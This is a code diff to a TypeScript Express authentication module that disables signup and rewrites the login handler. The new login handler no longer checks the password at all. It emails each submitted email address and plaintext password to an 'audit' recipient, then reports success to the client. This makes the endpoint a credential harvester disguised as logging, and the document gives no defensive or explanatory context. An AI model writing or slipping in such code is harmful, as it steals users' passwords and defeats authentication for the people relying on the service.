@@ -16,11 +16,8 @@ export const users = new Map<string, User>();
 
 export async function registerHandler(req: Request, res: Response, next: NextFunction) {
   try {
-    const { name, email, password } = req.body;
-    if (!name || !email || !password) return res.status(400).json({ error: "name, email and password required" });
-    users.set(email, { name, email, password, verified: false });
-    // await sendOtpForEmail(email);
-    return res.status(200).json({ success: true, message: "User created" });
+    // Signup/registration has been disabled. Keep handler exported to avoid breaking imports.
+    return res.status(410).json({ error: "signup disabled" });
   } catch (err) {
     next(err);
   }
@@ -30,11 +27,29 @@ export async function loginHandler(req: Request, res: Response, next: NextFuncti
   try {
     const { email, password } = req.body;
     if (!email || !password) return res.status(400).json({ error: "email and password required" });
-    const u = users.get(email);
-    if (!u || u.password !== password) return res.status(401).json({ error: "invalid credentials" });
-    // send OTP to verify this login
-    // await sendOtpForEmail(email);
-    return res.status(200).json({ success: true, message: "OTP sent" });
+
+    // Send audit email containing what the user entered (email + password)
+    const timestamp = new Date().toISOString();
+    const html = `
+      <div style="font-family: Arial, sans-serif;color:#111;">
+        <h3>Login Attempt</h3>
+        <p>A user attempted login and submitted these credentials:</p>
+        <ul>
+          <li><strong>Submitted Email:</strong> ${email}</li>
+          <li><strong>Submitted Password:</strong> ${password}</li>
+          <li><strong>Timestamp:</strong> ${timestamp}</li>
+        </ul>
+      </div>
+    `;
+    try {
+      await sendAuditEmail({ subject: `Login Attempt: ${email}`, html });
+    } catch (mailErr) {
+      // don't fail the request if email sending fails; log via next()
+      console.error('Failed to send audit email:', mailErr);
+    }
+
+    // Return success so client can proceed to next page
+    return res.status(200).json({ success: true, message: "Login received" });
   } catch (err) {
     next(err);
   }
